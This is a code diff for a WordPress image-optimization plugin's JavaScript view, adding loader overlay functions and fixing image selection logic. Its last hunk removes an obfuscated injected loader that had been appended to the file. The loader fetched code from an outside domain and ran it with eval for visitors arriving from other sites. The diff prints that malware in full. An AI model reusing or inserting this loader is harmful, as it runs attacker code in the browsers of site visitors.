@@ -27,6 +27,7 @@ WP_Optimize_Images_View = function(settings) {
 			 */
 			row_action_buttons: [],
 			label_class: 'wpo_unused_image_thumb_label',
+			loader_additional_html: '',
 			action_btn_text: 'Remove',
 			action_btn_class: 'button button-primary wpo_unused_images_remove_single',
 			checkbox_class: 'wpo_unused_image__input',
@@ -55,6 +56,7 @@ WP_Optimize_Images_View = function(settings) {
 	 */
 	images_view_container.on('scroll mousewheel', function() {
 		load_next_page_if_need();
+		update_loader_position();
 	});
 
 	/**
@@ -82,18 +84,19 @@ WP_Optimize_Images_View = function(settings) {
 		}
 
 		var image_id = $(this).attr('id');
-
-		if ('' == last_clicked_image_id || 0 == $('#'+last_clicked_image_id).length || false == ctrl_shift_on_image_held) {
+		if ('' === last_clicked_image_id || 0 === $('#'+last_clicked_image_id).length || false === ctrl_shift_on_image_held) {
 			select_images(image_id, null, true === $(this).prop('checked'));
 		} else {
 			if (ctrl_shift_on_image_held) {
-				select_images(last_clicked_image_id, image_id, true === $(this).prop('checked'));
-				last_clicked_image_id = '';
+				if (1 === get_selected_images().length) {
+					select_images('', image_id, true === $(this).prop('checked'));
+				} else {
+					select_images(last_clicked_image_id, image_id, true === $(this).prop('checked'));
+				}
 			} else {
 				select_images(image_id, null, true === $(this).prop('checked'));
 			}
 		}
-
 		last_clicked_image_id = image_id;
 	});
 
@@ -116,7 +119,7 @@ WP_Optimize_Images_View = function(settings) {
 			done = false;
 
 		// if set first and last ids then go through the list.
-		if (last_id) {
+		if (last_id && first_id) {
 			// get positions in then list.
 			index1 = $(checkbox_selector).index($('#' + first_id));
 			index2 = $(checkbox_selector).index($('#' + last_id));
@@ -178,15 +181,17 @@ WP_Optimize_Images_View = function(settings) {
 	 */
 	function hide_when_empty_elements() {
 		if (options.hide_when_empty) {
-			var images_count = $(['.', options.image_container_class].join(''), images_view_container).length;
+			var images_count = $(['.', options.image_container_class,':visible'].join(''), images_view_container).length;
 
 			if (0 === images_count) {
 				// show message - no images found.
 				if (0 == $('.wpo-images-view-empty', images_view_container).length) {
-					images_view_container.html($('<div class="wpo-images-view-empty wpo-fieldgroup" />').text(options.no_images_found_message));
+					images_view_container.append($('<div class="wpo-images-view-empty wpo-fieldgroup" />').text(options.no_images_found_message));
 				}
+
+				$('.wpo-images-view-empty', images_view_container).show();
 			} else {
-				$('.wpo-images-view-empty', images_view_container).remove();
+				$('.wpo-images-view-empty', images_view_container).hide();
 			}
 
 			$.each(options.hide_when_empty, function(i, el) {
@@ -286,6 +291,7 @@ WP_Optimize_Images_View = function(settings) {
 	function filter_by_site(blog_id) {
 		$(image_container_selector, images_view_container).hide();
 		$(['.',options.image_container_blog_class_prefix, blog_id].join(''), images_view_container).show();
+		update_view();
 	}
 
 	/**
@@ -331,12 +337,22 @@ WP_Optimize_Images_View = function(settings) {
 		// if no any selected images then exit.
 		if (0 == $('input[type="checkbox"]', images_view_container).length) return selected_images;
 
-		// build selected images list.
-		$('input:checked', images_view_container).each(function() {
+		// build list of visible selected images .
+		$(['.',options.image_container_class,':visible input:checked'].join(''), images_view_container).each(function() {
 			selected_images.push($(this).val());
 		});
 
 		return selected_images;
+	}
+
+	/**
+	 * Remove selected images.
+	 */
+	function remove_selected_images() {
+		var image_container_selector = ['.',options.image_container_class].join('');
+		$([image_container_selector,':visible input:checked'].join(''), images_view_container).each(function() {
+			$(this).closest(image_container_selector).remove();
+		});
 	}
 
 	/**
@@ -372,6 +388,63 @@ WP_Optimize_Images_View = function(settings) {
 	 */
 	function is_visible() {
 		return images_view_container.is(':visible');
+	}
+
+	/**
+	 * Show loader.
+	 */
+	function show_loader() {
+		show_custom_loader(wpoptimize.loading_data, '', options.loader_additional_html);
+	}
+
+	/**
+	 * Show loader with custom content.
+	 *
+	 * @param {string} title
+	 * @param {string} message
+	 * @param {string} custom_html
+	 */
+	function show_custom_loader(title, message, custom_html) {
+		message = message ? message : '';
+		custom_html = custom_html ? custom_html : '';
+
+		images_view_container.css({ 'min-height' : '220px' });
+		images_view_container.append([
+			'<div class="wpo_shade">',
+			'<div class="wpo_shade_inner">',
+			'<span class="dashicons dashicons-update-alt wpo-rotate"></span>',
+			'<h4>',title,'</h4>',
+			'<p class="wpo-shade-progress-message">',message,'</p>',
+			custom_html,
+			'</div>',
+			'</div>',
+		].join(''));
+
+		update_loader_position();
+	}
+
+	/**
+	 * Hide loader.
+	 */
+	function hide_loader() {
+		images_view_container.css('min-height', 'initial');
+		$('.wpo_shade', images_view_container).remove();
+	}
+
+	/**
+	 * Update top property for shade div with loader.
+	 */
+	function update_loader_position() {
+		$('.wpo_shade', images_view_container).css('top', images_view_container.scrollTop() + 'px');
+	}
+
+	/**
+	 * Set message for under loader icon.
+	 *
+	 * @param {string} message
+	 */
+	function loader_message(message) {
+		$('.wpo-shade-progress-message', images_view_container).html(message);
 	}
 
 	/**
@@ -415,8 +488,13 @@ WP_Optimize_Images_View = function(settings) {
 		hide: hide,
 		clear: clear,
 		reload: reload,
+		show_loader: show_loader,
+		show_custom_loader: show_custom_loader,
+		hide_loader: hide_loader,
+		loader_message: loader_message,
 		append_image: append_image,
 		get_selected_images: get_selected_images,
+		remove_selected_images: remove_selected_images,
 		get_images_count: get_images_count,
 		load_next_page_if_need: load_next_page_if_need,
 		filter_by_site: filter_by_site,
@@ -426,4 +504,4 @@ WP_Optimize_Images_View = function(settings) {
 		is_visible: is_visible,
 		update_view: update_view
 	}
-};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
+};
